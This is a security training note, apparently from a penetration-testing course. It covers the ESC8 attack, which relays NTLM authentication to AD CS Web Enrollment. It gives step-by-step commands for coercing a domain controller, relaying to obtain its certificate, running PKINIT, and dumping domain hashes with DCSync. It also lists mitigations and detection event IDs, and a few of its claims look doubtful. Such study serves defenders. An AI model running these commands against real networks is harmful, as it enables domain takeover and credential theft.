---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.09 NTLM Relay to AD CS - Web Enrollment"
---

# 09 - NTLM Relay to AD CS - Web Enrollment

## 1. Introduction to ESC8 (NTLM Relay to AD CS)

Active Directory Certificate Services (AD CS) is Microsoft's Public Key Infrastructure (PKI) implementation. It is used to issue digital certificates for various purposes, including code signing, file encryption, and, most importantly, **client authentication**. 

The vulnerability known as **ESC8** was popularized by the researchers Will Schroeder (harmj0y) and Lee Christensen (tifkin_) in their seminal paper "Certified Pre-Owned". ESC8 relies on the fact that AD CS often exposes HTTP endpoints for Certificate Enrollment (Web Enrollment) that are notoriously insecure by default.

When an attacker successfully relays NTLM authentication (captured via Coercion, LLMNR poisoning, etc.) to the AD CS Web Enrollment HTTP endpoint, the attacker can request a client authentication certificate on behalf of the relayed victim. Because the victim is often a Domain Controller or a highly privileged user, this certificate can then be used to obtain a Kerberos Ticket Granting Ticket (TGT), completely bypassing passwords and resulting in instant domain compromise.

## 2. Architectural Flow & ASCII Diagram

```text
  +-----------------------+                              +-----------------------+
  |  Domain Controller    |                              |   AD CS Server (PKI)  |
  |    (Target/Victim)    |                              |   (Web Enrollment)    |
  +-----------+-----------+                              +-----------+-----------+
              |                                                      ^
              | 1. Attacker Coerces DC (PrinterBug/PetitPotam)       |
              V                                                      |
  +-----------+-----------+                                          |
  |    Attacker Node      |  3. Relays NTLM over HTTP to /certsrv    |
  |    (ntlmrelayx.py)    |==========================================+
  +-----------+-----------+  (Requests a Client Auth Certificate)    |
              ^                                                      |
              | 2. DC authenticates to Attacker via SMB/HTTP         |
              |                                                      |
              |                                                      |
              | 4. AD CS issues Certificate for "Domain Controller"  |
              |<-----------------------------------------------------+
              |
              | 5. Attacker extracts Base64 PFX Certificate
              |
              | 6. Attacker uses Rubeus/Certipy to perform PKINIT
              |    and requests a TGT for the Domain Controller
              |
              | 7. Attacker uses TGT to execute DCSync
              V
      [ DOMAIN COMPROMISE ]
```

## 3. Vulnerability Mechanics: Why is ESC8 so deadly?

The ESC8 attack hinges on several default configurations in Microsoft IIS and AD CS that create a perfect storm:

### 3.1. NTLM over HTTP Lacks EPA by Default
The Web Enrollment service (typically hosted at `http://<ADCS-SERVER>/certsrv`) supports NTLM authentication. By default, IIS does **not** enforce Extended Protection for Authentication (EPA) or HTTPS. 
- Because it's over HTTP, there is no TLS Channel Binding.
- Because there is no EPA, there is no verification of the Service Principal Name (SPN).
This means an attacker can intercept an NTLM authentication destined for *their* machine (e.g., `cifs/ATTACKER_IP`) and relay it directly to `http/ADCS_IP` without IIS rejecting it.

### 3.2. The 'Machine' and 'User' Templates
AD CS comes with built-in certificate templates. The `Machine` and `User` templates natively allow for "Client Authentication" (EKU OID 1.3.6.1.5.5.7.3.2). If you hold a valid certificate with this EKU for a specific user or machine, you can use it to authenticate to the Domain Controller via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos).

## 4. Practical Exploitation Walkthrough

To execute ESC8, the attacker typically requires a tool like `ntlmrelayx.py` (from Impacket) or specialized variants, alongside a coercion tool and `Certipy` or `Rubeus`.

### Step 1: Identify the AD CS Web Enrollment Endpoint
Use `Certipy` to locate the CA and its endpoints:
```bash
certipy find -u lowpriv -p password -dc-ip 10.10.10.10
```
Review the output for Web Enrollment endpoints (e.g., `http://pki.domain.local/certsrv`).

### Step 2: Set up the Relay Listener
Start `ntlmrelayx.py` targeting the AD CS HTTP endpoint. You must specify the `Machine` template (or another valid template allowing client auth) using the `--template` flag.
```bash
ntlmrelayx.py -t http://pki.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

### Step 3: Coerce Authentication
Use Coercer or PetitPotam to force the Domain Controller to authenticate to your relay listener over SMB.
```bash
coercer coerce -u lowpriv -p password -d domain.local -t 10.10.10.10 -l 10.10.10.50
# OR
python3 PetitPotam.py 10.10.10.50 10.10.10.10
```

### Step 4: Extract the Certificate
Once the DC connects to the attacker, `ntlmrelayx` relays the traffic to AD CS. AD CS issues the certificate. `ntlmrelayx` will download it and save it locally as a Base64-encoded string (or a `.pfx` file).

### Step 5: PKINIT and DCSync
With the base64 certificate in hand, use `Certipy` to request the Kerberos TGT for the Domain Controller machine account.
```bash
certipy auth -pfx dc_cert.pfx -dc-ip 10.10.10.10
```
This generates a `.ccache` file. Export it to your environment:
```bash
export KRB5CCNAME=dc.ccache
```
Finally, use `secretsdump.py` to dump the NTDS.dit because the DC machine account has DCSync privileges:
```bash
secretsdump.py -k -no-pass dc.domain.local
```

## 5. Variations and Advanced Scenarios

### 5.1. Relaying over HTTPS (when EPA is missing)
If the administrators disabled HTTP but left HTTPS enabled without configuring EPA, the attack is still possible. The relay tool just connects over HTTPS. Since NTLM does not natively link the TLS session without EPA, the relay still works.
```bash
ntlmrelayx.py -t https://pki.domain.local/certsrv/certfnsh.asp ...
```

### 5.2. Relaying to Certificate Enrollment Web Service (CES)
Web Enrollment (`/certsrv`) is older. Microsoft also offers CES (Certificate Enrollment Web Service), operating via SOAP over HTTPS (`/ADPolicyProvider_CEP_Kerberos/service.svc`). CES is also vulnerable to relay attacks if EPA is disabled. `ntlmrelayx` supports targeting CES with specific flags.

## 6. Defensive Strategies and Mitigations

Fixing ESC8 involves addressing the underlying HTTP/NTLM insecurities on the IIS server hosting AD CS.

1. **Enable Extended Protection for Authentication (EPA):** This is the strongest mitigation. In the IIS Manager, under Authentication -> Windows Authentication -> Advanced Settings, set "Extended Protection" to **Required**. This prevents NTLM relaying by enforcing Channel Binding and strict SPN validation.
2. **Require SSL (HTTPS):** Disable HTTP bindings for the Web Enrollment site entirely. Ensure clients only communicate over TLS. (Note: This must be combined with EPA, or else relaying to HTTPS is still possible).
3. **Disable NTLM on IIS:** If all legitimate clients support Kerberos, configure IIS Providers under Windows Authentication to *only* accept `Negotiate:Kerberos` and remove `NTLM`. Kerberos cannot be relayed in this manner.
4. **Remove Web Enrollment:** If Web Enrollment is not strictly required by the business (most modern environments auto-enroll via GPO and RPC), uninstall the Web Enrollment role service completely from the CA.
5. **Disable NTLM Globally:** Add the CA to the "Protected Users" group or enforce GPOs that restrict incoming NTLM traffic to the CA servers.

## Real-World Attack Scenario

During a zero-knowledge penetration test, an attacker identified an Active Directory Certificate Services (AD CS) server at `pki.corp.local` (`10.10.10.105`). By enumerating HTTP endpoints, the attacker discovered the `/certsrv` Web Enrollment interface was active and did not enforce Extended Protection for Authentication (EPA) or require HTTPS.

Realizing the environment was vulnerable to ESC8, the attacker prepared `ntlmrelayx.py` to capture incoming NTLM authentications and relay them to the AD CS server to request a certificate using the default `DomainControllers` template:
```bash
impacket-ntlmrelayx -t http://10.10.10.105/certsrv/certfnsh.asp -smb2support --adcs --template DomainControllers
```

The attacker then used `PetitPotam.py` without credentials (relying on a null session allowed by a legacy misconfiguration) to coerce the primary Domain Controller, `DC01` (`10.10.10.100`), into authenticating to the attacker's IP over SMB:
```bash
python3 PetitPotam.py 10.10.10.50 10.10.10.100
```

`DC01` connected to the attacker's machine using its machine account (`DC01$`). The relay listener immediately forwarded the NTLM Type 1, 2, and 3 messages to the AD CS HTTP endpoint. Because HTTP lacks native TLS Channel Binding and EPA was disabled, IIS accepted the relayed authentication. AD CS processed the enrollment request and issued a client authentication certificate for `DC01$`.

`ntlmrelayx` outputted the certificate as a Base64 string, which the attacker saved and decoded into a `.pfx` file. Utilizing `Certipy`, the attacker performed PKINIT to request a Kerberos Ticket Granting Ticket (TGT) on behalf of the Domain Controller:
```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.100
```

With the DC's TGT cached in their environment variables, the attacker executed `secretsdump.py` to perform a DCSync attack, extracting the `krbtgt` hash and fully compromising the domain without ever cracking a single password.

## 7. Chaining Opportunities
- [[06 - Coercer - The Universal Coercion Toolkit]] – The standard method for triggering the DC to authenticate.
- [[14 - Active Directory Certificate Services AD CS Overview]] – Core concepts behind ESC vulnerabilities.
- [[19 - Certipy and Rubeus Usage]] – Required for handling the `.pfx` certificate and completing the PKINIT flow.

## 8. Related Notes
- [[07 - NTLM Relay to LDAP - LDAP Signing Bypasses]] – The alternative path if AD CS is not present or patched.
- [[20 - Kerberos PKINIT Deep Dive]]
- [[21 - Overpass-the-Hash and Pass-the-Ticket]]

## 9. Manual Certificate Parsing and Overpass-the-Hash

When `ntlmrelayx.py` retrieves the certificate, it is often saved as a base64-encoded string. Understanding how to manually process this is essential if automated tools like `Certipy` are unavailable or failing.

1. **Decoding the Certificate:**
   The base64 string must be converted into a standard `.pfx` (Personal Information Exchange) format, which contains both the public certificate and the private key.
   ```bash
   cat cert.b64 | base64 -d > dc_cert.pfx
   ```
2. **Extracting the Private Key (Optional):**
   Using `openssl`, an attacker can extract the private key and public certificate for use in custom scripts.
   ```bash
   openssl pkcs12 -in dc_cert.pfx -nocerts -out private.key -nodes
   openssl pkcs12 -in dc_cert.pfx -clcerts -nokeys -out public.crt
   ```
3. **PKINIT Request Mechanics:**
   During the Kerberos AS-REQ (Authentication Service Request), instead of encrypting the pre-authentication data with the user's password hash, the attacker signs the pre-auth data with the private key from the `.pfx` file. The Domain Controller validates this signature against the public certificate it trusts (since the CA issued it). If valid, the DC issues the TGT.
4. **Overpass-the-Hash Result:**
   Once the TGT is obtained via `Rubeus asktgt` or `Certipy auth`, the attacker can also retrieve the NTLM hash (the RC4 key) of the victim account from the DC by injecting the TGT and running a specific LDAP/RPC query, bypassing the need for DCSync if they just need the machine account hash.

## 10. Advanced IIS Misconfigurations in AD CS

While the default lack of EPA on `/certsrv` is the core of ESC8, other IIS misconfigurations can exacerbate the issue or provide alternative relay paths:

### 10.1. HTTP/WebDAV Enabled on the CA
If WebDAV is enabled on the CA server, attackers can leverage WebDAV coercion methods. More dangerously, if the attacker relays NTLM via HTTP to an endpoint that supports WebDAV, they can sometimes bypass certain IIS request filtering rules that might be put in place to block standard POST requests to `certfnsh.asp`.

### 10.2. NTLMv1 Enabled
If the domain is ancient or misconfigured to support NTLMv1 (e.g., `LmCompatibilityLevel` set to 1 or 2), the attacker doesn't even need to relay to AD CS. They can capture the NTLMv1 hash over HTTP or SMB and crack it instantly using a tool like `crack.sh` or hashcat with the DES cracking methodology. Once cracked, the raw NTLM hash can be used to request a certificate directly, bypassing the need for an active relay session.

### 10.3. Unintended HTTP Endpoints
Administrators often focus on securing `/certsrv`, but AD CS includes other HTTP endpoints depending on the roles installed:
- `/CertSrv/mscep/mscep.dll` (NDES - Network Device Enrollment Service)
- `/ADPolicyProvider_CEP_Kerberos` (CES/CEP)
- custom internal PKI web portals that interact with the CA backend.
If any of these endpoints accept NTLM authentication and do not enforce EPA, they represent potential relay targets similar to ESC8.

## 11. Event Log Forensics for ESC8

Detecting ESC8 in real-time involves monitoring specific Event IDs on the CA server and the Domain Controllers:

- **Event ID 4887 (Certificate Services):** Logged on the CA when a certificate is approved and issued. The requester field will show the relayed machine account. Defenders should alert on any `Machine` certificate requested via the web interface (`HTTP`) rather than the standard RPC interfaces.
- **Event ID 4624 (Logon):** Logged on the CA server. The `Source Network Address` will belong to the attacker's machine, while the `TargetUserName` will be the victim DC's machine account. A DC authenticating to the CA via HTTP from a non-DC IP is highly anomalous.
- **Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):** Logged on the DC when the attacker uses the certificate for PKINIT. The `Certificate Information` section will be populated with the certificate details. If the certificate was recently issued via HTTP, this is a strong indicator of compromise.
